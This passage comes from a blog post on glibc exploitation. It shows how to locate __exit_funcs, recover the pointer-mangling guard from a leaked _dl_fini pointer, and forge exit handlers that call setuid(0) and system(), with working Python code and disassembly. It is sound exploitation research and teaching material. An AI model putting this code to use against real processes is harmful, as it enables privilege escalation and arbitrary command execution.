   0x000000000003a2c8 &lt;+72&gt;: mov    eax,0xffffffff
   0x000000000003a2cd &lt;+77&gt;: jmp    0x3a2c3 &lt;__gi___cxa_atexit&gt;
End of assembler dump.&lt;/__gi___cxa_atexit&gt;&lt;/__gi___cxa_atexit&gt;&lt;/__new_exitfn&gt;&lt;/__exit_funcs&gt;</pre></td></tr></tbody></table></code></pre></figure>

<p>What’s interesting is “__exit_funcs” being used.
“__exit_funcs” is an un-exported function but we can resolve it by disassembling
that piece of assembly with capstone and retrieving the needed VA.
“__cxa_atexit()” is an exported symbol so we can retrieve the VA easily using
pwntools.elf.ELF.
You can see at VA 0x3a28a that it calculates the address of “__exit_funcs”.</p>

<p>Here is the code I wrote to do just that:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="code"><pre><span class="c1"># get __exit_funcs addr
</span><span class="k">def</span> <span class="nf">get_exit_funcs</span> <span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">):</span>
    <span class="n">md</span> <span class="o">=</span> <span class="n">Cs</span> <span class="p">(</span><span class="n">CS_ARCH_X86</span><span class="p">,</span> <span class="n">CS_MODE_64</span><span class="p">)</span>
    <span class="n">md</span><span class="o">.</span><span class="n">detail</span> <span class="o">=</span> <span class="bp">True</span>

    <span class="c1"># look for ptr offset
</span>    <span class="n">ptr_exit_funcs</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">inst</span> <span class="ow">in</span> <span class="n">md</span><span class="o">.</span><span class="n">disasm</span> <span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">off</span><span class="p">:],</span> <span class="n">off</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">inst</span><span class="o">.</span><span class="n">mnemonic</span> <span class="o">!=</span> <span class="s">'lea'</span><span class="p">:</span>
            <span class="k">continue</span>
        <span class="k">for</span> <span class="n">operand</span> <span class="ow">in</span> <span class="n">inst</span><span class="o">.</span><span class="n">operands</span><span class="p">:</span>

            <span class="k">if</span> <span class="n">operand</span><span class="o">.</span><span class="nb">type</span> <span class="o">==</span> <span class="n">x86</span><span class="o">.</span><span class="n">X86_OP_MEM</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">inst</span><span class="o">.</span><span class="n">reg_name</span> <span class="p">(</span><span class="n">operand</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">base</span><span class="p">)</span> <span class="o">!=</span> <span class="s">'rip'</span><span class="p">:</span>
                    <span class="k">continue</span>
                <span class="n">ptr_exit_funcs</span> <span class="o">=</span> <span class="n">inst</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">inst</span><span class="o">.</span><span class="n">size</span> <span class="o">+</span> <span class="n">operand</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">disp</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">ptr_exit_funcs</span><span class="p">:</span>
            <span class="k">break</span>

    <span class="k">if</span> <span class="n">ptr_exit_funcs</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="k">return</span> <span class="n">ptr_exit_funcs</span></pre></td></tr></tbody></table></code></pre></figure>

<p>I’ll show at the end of the article how to use it to bypass pointer mangling.
Let’s first have a look at tls_dtor_list.</p>

<h1 id="about-__call_tls_dtors-and-finding-tls_dtor_list">About __call_tls_dtors() and finding tls_dtor_list</h1>

<p>I was talking about “__call_tls_dtors()” being an interesting piece of code
to look at.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="code"><pre><span class="cm">/* Call the destructors.  This is called either when a thread returns from the
   initial function or when the process exits via the exit function.  */</span>
<span class="kt">void</span>
<span class="nf">__call_tls_dtors</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">tls_dtor_list</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">struct</span> <span class="n">dtor_list</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="n">tls_dtor_list</span><span class="p">;</span>
      <span class="n">dtor_func</span> <span class="n">func</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">;</span>
<span class="cp">#ifdef PTR_DEMANGLE
</span>      <span class="n">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">func</span><span class="p">);</span>
<span class="cp">#endif
</span>
      <span class="n">tls_dtor_list</span> <span class="o">=</span> <span class="n">tls_dtor_list</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
      <span class="n">func</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">obj</span><span class="p">);</span>

      <span class="cm">/* Ensure that the MAP dereference happens before
  l_tls_dtor_count decrement.  That way, we protect this access from a
  potential DSO unload in _dl_close_worker, which happens when
  l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span>
      <span class="n">atomic_fetch_add_release</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">l_tls_dtor_count</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="n">free</span> <span class="p">(</span><span class="n">cur</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>The part that really interest us is about tls_dtor_list being used.</p>

<p>The corresponding assembly.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="code"><pre>pwndbg&gt; disassemble __GI___call_tls_dtors
Dump of assembler code for function __GI___call_tls_dtors:
   0x000000000003a5c0 &lt;+0&gt;: push   rbp
   0x000000000003a5c1 &lt;+1&gt;: push   rbx
   0x000000000003a5c2 &lt;+2&gt;: sub    rsp,0x8
   0x000000000003a5c6 &lt;+6&gt;: mov    rbp,QWORD PTR [rip+0x3887b3]        # 0x3c2d80
   0x000000000003a5cd &lt;+13&gt;: mov    rbx,QWORD PTR fs:[rbp+0x0]
   0x000000000003a5d2 &lt;+18&gt;: test   rbx,rbx
   0x000000000003a5d5 &lt;+21&gt;: je     0x3a61e &lt;__gi___call_tls_dtors&gt;
   0x000000000003a5d7 &lt;+23&gt;: nop    WORD PTR [rax+rax*1+0x0]
   0x000000000003a5e0 &lt;+32&gt;: mov    rdx,QWORD PTR [rbx+0x18]
   0x000000000003a5e4 &lt;+36&gt;: mov    rax,QWORD PTR [rbx]
   0x000000000003a5e7 &lt;+39&gt;: mov    rdi,QWORD PTR [rbx+0x8]
   0x000000000003a5eb &lt;+43&gt;: ror    rax,0x11
   0x000000000003a5ef &lt;+47&gt;: xor    rax,QWORD PTR fs:0x30
   0x000000000003a5f8 &lt;+56&gt;: mov    QWORD PTR fs:[rbp+0x0],rdx
   0x000000000003a5fd &lt;+61&gt;: call   rax
   0x000000000003a5ff &lt;+63&gt;: mov    rax,QWORD PTR [rbx+0x10]
   0x000000000003a603 &lt;+67&gt;: lock sub QWORD PTR [rax+0x450],0x1
   0x000000000003a60c &lt;+76&gt;: mov    rdi,rbx
   0x000000000003a60f &lt;+79&gt;: call   0x1f8a8
   0x000000000003a614 &lt;+84&gt;: mov    rbx,QWORD PTR fs:[rbp+0x0]
   0x000000000003a619 &lt;+89&gt;: test   rbx,rbx
   0x000000000003a61c &lt;+92&gt;: jne    0x3a5e0 &lt;__gi___call_tls_dtors&gt;
   0x000000000003a61e &lt;+94&gt;: add    rsp,0x8
   0x000000000003a622 &lt;+98&gt;: pop    rbx
   0x000000000003a623 &lt;+99&gt;: pop    rbp
   0x000000000003a624 &lt;+100&gt;: ret    
End of assembler dump.&lt;/__gi___call_tls_dtors&gt;&lt;/__gi___call_tls_dtors&gt;</pre></td></tr></tbody></table></code></pre></figure>

<p>You can see at VA 0x3a5c6 that it dereferences the pointer to tls_dtor_list.
So we can disassemble that function and find that offset using capstone.
“__call_tls_dtors” is exported so the address can be easily parsed out
using pwntools.elf.ELF.</p>

<p>I didn’t write code for it but the idea is the same as for __exit_funcs,
this is left as an exercise to the reader.</p>

<h1 id="bypassing-pointer-mangling">Bypassing pointer mangling</h1>
<p>While playing with a binary challenge, I happened to see that _dl_fini()
is often registered in the __exit_funcs array, so we can recalculate
the pointer_guard value and thus bypass pointer mangling.</p>

<p>The issue with “_dl_fini()” is that it seems to be an un-exported symbol.
I’ve found the address while digging in gdb.
An elf parser probably has to be written to find “_dl_fini()” address.</p>

<p>A vulnerability that allows you to leak an encoded pointer in __exit_funcs
is also necessary.
Here we use _dl_fini encoded pointer.</p>

<p>The formula to compute the pointer_guard assuming that “_dl_fini()”
is used is as follow:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ror</span> <span class="p">(</span><span class="n">ptr_encoded</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="o">^</span> <span class="n">_dl_fini</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Here the code you’ve been waiting for. We re-use “get_exit_funcs()” that
was showed earlier.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="code"><pre><span class="c1"># Rotate left: 0b1001 --&gt; 0b0011
</span><span class="n">rol</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">val</span><span class="p">,</span> <span class="n">r_bits</span><span class="p">,</span> <span class="n">max_bits</span><span class="p">:</span> \
    <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">|</span> \
    <span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">max_bits</span><span class="o">-</span><span class="p">(</span><span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)))</span>
 
<span class="c1"># Rotate right: 0b1001 --&gt; 0b1100
</span><span class="n">ror</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">val</span><span class="p">,</span> <span class="n">r_bits</span><span class="p">,</span> <span class="n">max_bits</span><span class="p">:</span> \
    <span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)</span> <span class="o">|</span> \
    <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">max_bits</span><span class="o">-</span><span class="p">(</span><span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="n">libc_filename</span><span class="p">)</span>

<span class="c1"># get libc data
</span><span class="n">content</span> <span class="o">=</span> <span class="s">''</span>
<span class="k">with</span> <span class="nb">open</span> <span class="p">(</span><span class="n">libc_filename</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span> <span class="p">()</span>

<span class="c1"># get our exit_funcs address
</span><span class="n">off_cxa_atexit</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__cxa_atexit'</span><span class="p">]</span>
<span class="n">ptr_exit_funcs</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">get_exit_funcs</span> <span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">off_cxa_atexit</span><span class="p">)</span>
<span class="n">off_exit_funcs</span> <span class="o">=</span> <span class="n">ptr_exit_funcs</span> <span class="o">-</span> <span class="n">start_data</span>
<span class="n">__exit_funcs</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">libc_data</span><span class="p">[</span><span class="n">off_exit_funcs</span><span class="p">:</span><span class="n">off_exit_funcs</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="c1"># our encoded pointer location
</span><span class="n">off_ptr_encoded</span> <span class="o">=</span> <span class="p">(</span><span class="n">__exit_funcs</span> <span class="o">-</span> <span class="n">start_data</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span>
<span class="n">ptr_encoded</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">libc_data</span><span class="p">[</span><span class="n">off_ptr_encoded</span><span class="p">:</span><span class="n">off_ptr_encoded</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="c1"># this is used to encode pointers
</span><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ror</span> <span class="p">(</span><span class="n">ptr_encoded</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="o">^</span> <span class="n">_dl_fini</span>

<span class="k">print</span> <span class="s">'</span><span class="se">\n</span><span class="s">[+] Leak __exit_funcs'</span>
<span class="k">print</span> <span class="s">'start_data               : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">start_data</span>
<span class="k">print</span> <span class="s">'ptr_exit_funcs           : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">ptr_exit_funcs</span>
<span class="k">print</span> <span class="s">'exit_funcs               : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">__exit_funcs</span>
<span class="k">print</span> <span class="s">'off_ptr_encoded          : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">off_ptr_encoded</span>
<span class="k">print</span> <span class="s">'ptr_encoded              : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">ptr_encoded</span>
<span class="k">print</span> <span class="s">'ptr_guard                : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="n">ptr_guard</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Now that we got the pointer_guard, what do we do?</p>

<p>We craft a fake __exit_funcs and corrupt the original __exit_funcs.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="code"><pre><span class="k">class</span> <span class="nc">CxaFunc</span> <span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">ptr_guard</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">func</span> <span class="o">=</span> <span class="n">func</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">arg</span> <span class="o">=</span> <span class="n">arg</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ptr_guard</span>

    <span class="k">def</span> <span class="nf">__str__</span> <span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># flavor = 4 (ef_cxa) + func + arg + NULL (dso handle)
</span>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span><span class="p">:</span>
            <span class="n">encoded</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">func</span> <span class="o">^</span> <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">encoded</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">func</span>
        <span class="k">print</span> <span class="s">'func : 0x</span><span class="si">%016</span><span class="s">x | encoded : 0x</span><span class="si">%016</span><span class="s">x | arg : 0x</span><span class="si">%016</span><span class="s">x'</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">func</span><span class="p">,</span> <span class="n">encoded</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">arg</span><span class="p">)</span>
  <span class="c1"># ef_cxa == 4 | encoded function pointer | argument | dso handle set to NULL
</span>        <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">encoded</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">arg</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">data</span>

<span class="k">class</span> <span class="nc">ExitHandlers</span> <span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ptr_guard</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">handlers</span> <span class="o">=</span> <span class="nb">list</span> <span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">ptr_guard</span>

    <span class="k">def</span> <span class="nf">append</span> <span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
        <span class="n">cxafunc</span> <span class="o">=</span> <span class="n">CxaFunc</span> <span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">ptr_guard</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">handlers</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span><span class="n">cxafunc</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">__str__</span> <span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">fake_exit_funcs</span> <span class="o">=</span> <span class="s">''</span>
        <span class="c1"># next = NULL
</span>        <span class="n">fake_exit_funcs</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="c1"># idx = number of handlers
</span>        <span class="k">print</span> <span class="s">'Packing </span><span class="si">%</span><span class="s">d handlers'</span> <span class="o">%</span> <span class="nb">len</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">handlers</span><span class="p">)</span>
        <span class="n">fake_exit_funcs</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="nb">len</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">handlers</span><span class="p">))</span>
        <span class="k">for</span> <span class="n">cxafunc</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">handlers</span><span class="p">:</span>
            <span class="n">fake_exit_funcs</span> <span class="o">+=</span> <span class="nb">str</span> <span class="p">(</span><span class="n">cxafunc</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">fake_exit_funcs</span>

<span class="c1"># build our exit_funcs functions list
</span><span class="n">fake_exit_funcs</span> <span class="o">=</span> <span class="n">ExitHandlers</span> <span class="p">(</span><span class="n">ptr_guard</span><span class="p">)</span>
<span class="c1"># setuid
</span><span class="n">fake_exit_funcs</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span><span class="n">func_setuid</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="c1"># system and get cmd
</span><span class="k">for</span> <span class="n">heap_addr</span> <span class="ow">in</span> <span class="n">heap_addrs</span><span class="p">:</span>
    <span class="n">fake_exit_funcs</span><span class="o">.</span><span class="n">append</span> <span class="p">(</span><span class="n">func_system</span><span class="p">,</span> <span class="n">heap_addr</span><span class="p">)</span>
<span class="n">fake_exit_funcs</span> <span class="o">=</span> <span class="nb">str</span> <span class="p">(</span><span class="n">fake_exit_funcs</span><span class="p">)</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Given you’ve recalculated the proper pointer_guard … pointer mangling is
bypassed.</p>

<h1 id="other-untested-ideas-to-get-the-pointer_guard">Other (untested) ideas to get the pointer_guard?</h1>

<p>There probably is another way to get that pointer_guard given you’ve got
an arbitrary infoleak. This may be possible through a pointer corruption
or a UAF or Type Confusion or something else.
If the attacker somehow manage to find where ‘struct tcbhead’ is located
in memory, he may be able to just read the value out of it.</p>

<p>Last idea is probably far fetched but let’s look at it.
Let’s say you got an oracle : crash or not crash and that your process
is respawned through a fork().
You could probably use techniques similar as those used for blind rop
to guess the pointer guard.
More research can be done there but we don’t need it for now.</p>

<h1 id="about-glibc-ptmalloc-hooks">About glibc ptmalloc hooks</h1>

<p>It may come a time where you somehow can’t manage to exit a program running
as it may run in a infinite loop for example.</p>

<p>In order to use our previous technique, the process has to call
the libc exit() function.
This happens when the process prepare to exit.</p>

<p>We may be able to trigger that function before reaching the end of the program
by using glibc ptmalloc hooks.
In each glibc ptmalloc functions, there is a function pointer that is called
given it’s not NULL.
By over-writing one of these hooks with glibc exit() function
and triggering the corresponding malloc(), free() or realloc() call,
we’ll trigger the execution of our payload written in __exit_funcs.</p>

<p>These functions hook are all exported symbols that you can easily get with
pwntools.elf.ELF : __free_hook, __malloc_hook, __realloc_hook and __memalign_hook.</p>

<h1 id="conclusion">Conclusion</h1>

<p>Full mitigations bypass is still possible nowadays on the latest
Linux distribution given the proper vulnerabilities and binary. Every technique
is applicable on a case-by-case basis.
Pointer mangling was implemented in order to make destructors corruption
exploitation harder, but as can be seen it’s not impossible.</p>

<p>This technique is particularly useful when you don’t know where the stack is
and you have full RELRO activated.
It allows you to do an easy version of ROP.</p>

<p>Cheers,</p>

<p>m_101</p>

<h1 id="references">References</h1>

<ul>
  <li>The poisoned NULL byte, 2014 edition : <a href="https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html">https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html</a></li>
  <li>Pointer Encryption : <a href="https://sourceware.org/glibc/wiki/PointerEncryption">https://sourceware.org/glibc/wiki/PointerEncryption</a></li>
</ul>


  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/binholic/2017/03/31/yet-another-oscp-review.html">Previous : Yet Another OSCP Review</a>
    

    
    <a class="post-next" href="/binholic/2017/08/30/rhme3-qualifier-heap-exploitaiton.html">Next : RHMe3 Qualifier - Heap Exploitaiton</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/2017/05/20/notes-on-abusing-exit-handlers.html";
            this.page.identifier = "/2017/05/20/notes-on-abusing-exit-handlers";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
